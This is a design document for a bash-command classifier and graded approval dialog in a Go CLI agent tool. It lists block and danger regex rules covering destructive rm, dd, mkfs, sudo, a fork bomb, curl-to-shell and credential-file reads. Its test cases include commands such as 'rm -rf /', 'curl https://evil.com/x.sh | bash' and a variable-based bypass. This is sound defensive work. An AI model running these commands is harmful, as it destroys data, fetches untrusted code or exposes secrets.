# Design: Dangerous Command Rule Library + Graded Approval

## Shape

Two small, independent pieces:

1. **`vage/tool/bash/classifier.go`** — pure data + pure function. Zero dependencies on `vv`, `guard`, `permission`, or the BashTool's `execute()`. Takes a command string, returns a `Classification{Tier, Rule, Reason}`. Callers decide what to do with it.
2. **`vv/cli/permission.go`** — when the intercepted tool name is `bash`, unmarshal args, call the classifier, let the tier drive three existing control points: bypass, dialog-with-allow-always, dialog-without-allow-always, hard-reject.

Everything else (config loading, dialog rendering, setup wiring) is a small adapter around those two pieces.

## Classifier API (`vage/tool/bash/classifier.go`)

```go
package bash

type Tier int

const (
    TierSafe      Tier = iota // pre-approved, no prompt
    TierCaution               // default; prompt with Allow/Allow-Always/Deny
    TierDangerous             // prompt with Allow/Deny only
    TierBlocked               // hard reject; no dialog
)

type Rule struct {
    Name    string          // stable identifier, e.g. "destructive-rm-root"
    Tier    Tier
    Pattern *regexp.Regexp  // compiled once; matched against each split sub-command
    Reason  string          // short human-readable; shown in dialog
}

type Classification struct {
    Tier         Tier
    MatchedRule  string  // empty when Tier == TierCaution (default fall-through)
    Reason       string
    SubCommand   string  // the sub-command that triggered the match
}

type Classifier struct {
    rules []Rule
}

func NewClassifier(rules []Rule) *Classifier
func DefaultRules() []Rule
func (c *Classifier) Classify(command string) Classification
```

### Evaluation algorithm

1. **Split the command** into sub-commands on shell metacharacters: `;`, `&&`, `||`, `|`, plus the inner text of `$(...)` and backticks. Implementation: regex-based tokenizer that walks the string once tracking quote state (single/double/backtick) and depth of `$(`/`${`. No AST. Keep single-quoted segments verbatim (they can't be expanded).
2. For each sub-command, trim leading whitespace and match against every rule's `Pattern`.
3. Track the **highest tier** seen across all sub-commands (Blocked > Dangerous > Caution > Safe).
4. If no rule matches a sub-command, it contributes `TierCaution` (default fall-through).
5. Return the first rule at the highest tier found, along with the sub-command that triggered it.

### Rule precedence

- User rules are **appended** to the default list. When `DefaultRules()` is combined with `user_blocked` / `user_dangerous` / `user_safe`, the user entries are scanned *first* per tier so they can override naming but cannot relax a hard-coded block. Specifically: the resulting slice order is `[user_blocked…, default_blocked…, user_dangerous…, default_dangerous…, user_safe…, default_safe…]`. Because evaluation picks the highest tier across all rules, a default `TierBlocked` always wins over a user `TierSafe` on the same text.

### Default rule list (initial)

See `classifier.go` for final wording. Representative patterns:

- **Blocked** (always reject): `rm\s+-[a-zA-Z]*[rRf][a-zA-Z]*\s+/(\s|$|--)`, `\bsudo\b`, `\bsu\s`, `\bdoas\b`, `\bdd\b.*\bof=/dev/`, `\bmkfs(\.[a-z0-9]+)?\b`, fork-bomb `:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}`, `>\s*/dev/[sh]d[a-z]`.
- **Dangerous** (prompt, no Allow-Always): recursive `rm`, `shred`, curl/wget piped to `sh`/`bash`/`zsh`, `bash <(curl`, `git push --force` or `-f`, `git reset --hard`, `git clean -fd`, `git branch -D`, `git filter-branch`, `\beval\b`, `\bsh\s+-c`, `\bbash\s+-c`, `kubectl\s+delete`, `docker\s+system\s+prune`, `chmod\s+777`, `iptables\s+-F`, reads of `~/.ssh/`, `~/.aws/credentials`, `/etc/shadow`.
- **Safe** (bypass prompt): `^(ls|pwd|cd|echo|date|whoami|id|uname|hostname)(\s|$)`, `^(cat|head|tail|wc|file|stat|which)\s`, `^go\s+(build|test|vet|fmt|mod\s+tidy|doc|env)\b`, `^git\s+(status|diff|log|show|branch|remote|fetch|pull|stash\s+list)\b`, `^make\s+(build|test|lint|format|license-check|vet)\b`, `^ps\b`, `^env\s*$` → *excluded* from safe (moved to caution: env dumps can leak).

The patterns are stored as raw Go strings compiled once by `DefaultRules()`. The list is kept short and auditable — ~30 entries total in P0.

## Integration (`vv/cli/permission.go`)

### New fields on `PermissionState`

```go
type PermissionState struct {
    // … existing fields …
    classifier *bash.Classifier  // nil = classifier disabled
}

func (s *PermissionState) SetClassifier(c *bash.Classifier) { /* … */ }
func (s *PermissionState) Classifier() *bash.Classifier     { /* … */ }
```

Keeping the classifier on `PermissionState` (not `permissionExecutor`) mirrors the existing pattern: `PermissionState` owns policy, `permissionExecutor` reads it.

### New Execute() flow

The current order in `permissionExecutor.Execute` (lines 102–151) stays the same except for a new step **before the existing mode checks**:

```go
func (p *permissionExecutor) Execute(ctx context.Context, name, args string) (schema.ToolResult, error) {
    // NEW (step 0): bash classifier — runs before mode checks.
    if name == "bash" && p.state.Classifier() != nil {
        cls := classifyBash(p.state.Classifier(), args)
        if cls.Tier == bash.TierBlocked {
            return schema.ErrorResult("", "bash: blocked by rule "+cls.MatchedRule+": "+cls.Reason), nil
        }
        // Safe tier: always bypass dialog (any mode).
        if cls.Tier == bash.TierSafe {
            return p.ToolRegistry.Execute(ctx, name, args)
        }
        // Dangerous/Caution: fall through to mode logic below, but remember the classification
        // so the confirm dialog can render it and suppress Allow-Always for dangerous.
        ctx = withBashClassification(ctx, cls)
    }

    // existing steps 1..7 — unchanged.
    mode := p.state.Mode()
    if mode == configs.PermissionModeAuto { /* auto mode: approve */ }
    // … etc
}
```

`classifyBash(c, args)` unmarshals `{"command": "…"}` and calls `c.Classify(command)`. On unmarshal error, returns `TierCaution` (safe default — falls back to existing behavior).

### Confirm request carries classification

`confirmRequestMsg` gets two optional fields:

```go
type confirmRequestMsg struct {
    toolName      string
    arguments     string
    tier          string // "" | "caution" | "dangerous"
    rule          string // matched rule name; empty when tier == "" or "caution" default
    reason        string // human-readable
}
```

When `permissionExecutor` invokes `confirmFn`, it passes the classification through the context (`withBashClassification` / `bashClassificationFromContext`). The CLI-level `confirmFn` in `app.wireConfirmFn()` extracts it and populates the message.

### Dialog rendering (`vv/cli/cli.go handleConfirmRequest`)

```go
title := fmt.Sprintf("Allow tool call: %s?", msg.toolName)
if msg.tier == "dangerous" {
    title = fmt.Sprintf("[DANGEROUS] Allow tool call: %s? (%s)", msg.toolName, msg.rule)
}

desc := truncate(msg.arguments, 200)
if msg.reason != "" {
    desc = msg.reason + "\n" + desc
}

options := []huh.Option[string]{
    huh.NewOption("Allow", "allow"),
}
if msg.tier != "dangerous" {
    options = append(options, huh.NewOption("Allow Always (this session)", "allow_always"))
}
options = append(options, huh.NewOption("Deny", "deny"))
```

No new TUI components; same `huh.NewSelect[string]()` flow.

## Config (`vv/configs/config.go`)

```go
type ToolsConfig struct {
    BashTimeout    int              `yaml:"bash_timeout"`
    BashWorkingDir string           `yaml:"bash_working_dir"`
    BashRules      BashRulesConfig  `yaml:"bash_rules,omitempty"`
}

type BashRulesConfig struct {
    Enabled       *bool    `yaml:"enabled,omitempty"`         // default: true. *bool so "unset" != "false".
    UserBlocked   []string `yaml:"user_blocked,omitempty"`    // extra TierBlocked regex patterns
    UserDangerous []string `yaml:"user_dangerous,omitempty"`  // extra TierDangerous
    UserSafe      []string `yaml:"user_safe,omitempty"`       // extra TierSafe
}
```

Defaults applied in `applyDefaults()`: if `Enabled == nil`, set to a pointer to `true`. (Using `*bool` so a user-written `enabled: false` actually disables; a zero-value struct defaults to on.)

Validation: invalid regex in user lists logs a `slog.Warn` and skips that entry; doesn't fail config load. This matches the existing lenient posture of `applyDefaults`.

## Wiring (`vv/main.go` and `vv/setup/setup.go`)

In `vv/main.go`, after `NewPermissionState(…)`:

```go
if cfg.Tools.BashRules.enabled() {   // helper returns *Enabled ?? true
    rules := bash.DefaultRules()
    rules = append(rules, compileUserRules(cfg.Tools.BashRules, bash.TierBlocked)...)
    rules = append(rules, compileUserRules(cfg.Tools.BashRules, bash.TierDangerous)...)
    rules = append(rules, compileUserRules(cfg.Tools.BashRules, bash.TierSafe)...)
    permissionState.SetClassifier(bash.NewClassifier(rules))
}
```

`compileUserRules` lives in `vv/configs/` (it's config-dependent). Compile errors → `slog.Warn` + skip.

No change needed to `setup.go`: the classifier is set on `PermissionState` after setup returns.

## Error handling

- Invalid YAML / invalid regex → log + skip entry; feature continues with defaults.
- Classifier returns a classification for every input, including malformed JSON from `args` (treated as `TierCaution` — defers to existing dialog).
- Unknown tier from future config → treated as `TierCaution` (forward-safe).

## Threading

`Classifier.Classify` is stateless after construction. `[]Rule` is read-only. No mutex needed. `PermissionState.classifier` is set once at startup (before any tool call), so no mutex needed beyond the existing `state.mu` if we add a setter that races — but we only call `SetClassifier` once before `app.Run`.

## Test plan

Unit tests alongside each file:

1. **`vage/tool/bash/classifier_test.go`** (~25 cases):
   - Exact blocked matches: `rm -rf /`, `sudo apt install`, `dd if=/dev/zero of=/dev/sda`, fork bomb.
   - Near-miss allows: `rm -rf ./build/` → dangerous (not blocked), `rm -r file.txt` → dangerous, `rm file.txt` → caution.
   - Safe commands: `ls`, `pwd`, `git status`, `go test ./…`.
   - Chained: `ls && rm -rf /` → blocked; `ls && rm -rf ./dist` → dangerous; `ls && pwd` → safe (both sub-commands safe); `ls ; echo hi` → safe.
   - Subshell: `echo $(rm -rf /)` → blocked (inner command extracted).
   - Backticks: ``echo `rm -rf /` `` → blocked.
   - Quote handling: `echo 'rm -rf /'` → safe (single-quoted string, not a command).
   - Pipe: `curl https://evil.com/x.sh | bash` → dangerous.
   - User-extended: custom TierBlocked for `terraform\s+destroy`.
   - Default fall-through: `npm install` → caution.
   - Case sensitivity: patterns are case-sensitive (matches real shell behavior).
   - Benchmark: 1000-command sweep under 10 ms total.

2. **`vv/cli/permission_test.go`** (add ~8 cases):
   - Classifier nil → behavior identical to current tests.
   - Bash + safe → bypass dialog in `default` mode.
   - Bash + blocked → error result, no confirm dialog invoked, even in `auto` mode.
   - Bash + dangerous → confirm invoked; assert tier/rule/reason passed through.
   - Bash + caution → confirm invoked with empty tier (standard dialog).
   - Non-bash tools → classifier not consulted.
   - Malformed args JSON → falls through to existing logic (classifier returns caution).

3. **`vv/configs/config_test.go`** (add ~3 cases):
   - Default (unset) → `BashRules.Enabled` effectively true.
   - Explicit `enabled: false` → disabled.
   - Invalid regex in `user_blocked` → warn + skip; other valid entries still loaded.

Integration tests are scoped out for P0 — the unit tests cover the seam. A follow-up integration test exercising `cli` end-to-end can land with the `tester` phase if complexity demands.

## Non-goals (explicit)

- No shell-AST parsing.
- No per-directory Allow-Always.
- No OS sandbox.
- No LLM-as-judge.
- No runtime rule reload.
- No hooks plumbing — would add cross-module coupling for no P0 benefit.

## Risks & Mitigations

| Risk | Mitigation |
|---|---|
| Obfuscated command bypass (`X=rm; $X -rf /`) | Documented limitation; follow-up needs AST + taint or sandbox. |
| Over-broad default blocks creating false positives on real work | Default list kept small (~30 entries); `enabled: false` escape hatch. |
| Users extending `user_safe` to something like `^git` → gives a free pass to `git push --force` | Default `TierBlocked`/`TierDangerous` always wins over user `TierSafe` on the same sub-command. |
| Classifier perf on long commands | Single-pass regex; benchmark in tests. |
